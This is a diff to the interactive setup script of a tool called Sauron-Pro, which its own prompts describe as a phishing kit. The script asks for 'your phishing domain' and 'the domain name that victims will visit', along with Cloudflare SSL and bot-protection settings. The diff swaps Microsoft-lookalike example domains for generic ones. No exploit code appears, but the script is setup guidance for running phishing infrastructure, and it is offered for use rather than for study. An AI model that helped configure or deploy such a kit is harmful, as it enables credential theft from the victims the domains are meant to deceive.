@@ -105,10 +105,10 @@ show_configuration() {
     value=$(get_env_value "SAURON_DOMAIN")
     if [ -n "$value" ]; then
         echo -e "  ${GREEN}✅ SAURON_DOMAIN${NC} = $value"
-        echo -e "     Your phishing domain (e.g., microsoftlogin365.com)"
+        echo -e "     Your phishing domain (e.g., securelogin365.com)"
     else
         echo -e "  ${RED}❌ SAURON_DOMAIN${NC} = (not set)"
-        echo -e "     Your phishing domain (e.g., microsoftlogin365.com)"
+        echo -e "     Your phishing domain (e.g., securelogin365.com)"
     fi
     echo ""
     
@@ -258,7 +258,7 @@ interactive_setup() {
     echo -e "${CYAN}https://github.com/Skillz147/Sauron-Pro#configuration-management${NC}"
     echo ""
     echo -e "${WHITE}You will need:${NC}"
-    echo -e "  ${GREEN}1.${NC} A domain name (e.g., microsoftlogin365.com)"
+    echo -e "  ${GREEN}1.${NC} A domain name (e.g., securelogin365.com)"
     echo -e "  ${GREEN}2.${NC} Cloudflare account with your domain added"
     echo -e "  ${GREEN}3.${NC} Cloudflare API token (for SSL certificates)"
     echo -e "  ${GREEN}4.${NC} Cloudflare Turnstile secret (for bot protection)"
@@ -292,7 +292,7 @@ EOF
     echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     echo ""
     echo -e "${WHITE}This is the domain name that victims will visit.${NC}"
-    echo -e "${WHITE}Examples: ${GREEN}microsoftlogin365.com${NC}, ${GREEN}msftauthentication.com${NC}, ${GREEN}office365secure.com${NC}"
+    echo -e "${WHITE}Examples: ${GREEN}securelogin365.com${NC}, ${GREEN}authservice.com${NC}, ${GREEN}cloudplatform.com${NC}"
     echo ""
     echo -e "${YELLOW}Requirements:${NC}"
     echo -e "  • Purchase domain from any registrar (Namecheap, GoDaddy, etc.)"
@@ -302,7 +302,7 @@ EOF
     current=$(get_env_value "SAURON_DOMAIN")
     while true; do
         echo ""
-        echo -e "${WHITE}Enter just the domain name (e.g., microsoftlogin365.com)${NC}"
+        echo -e "${WHITE}Enter just the domain name (e.g., securelogin365.com)${NC}"
         if [ -n "$current" ]; then
             echo -e "${YELLOW}Current value: $current (press Enter to keep)${NC}"
         fi
@@ -325,7 +325,7 @@ EOF
             echo -e "${GREEN}✅ Domain configured: $value${NC}"
             break
         else
-            echo -e "${YELLOW}Please enter just the domain name (like: microsoftlogin365.com)${NC}"
+            echo -e "${YELLOW}Please enter just the domain name (like: securelogin365.com)${NC}"
         fi
     done
     echo ""
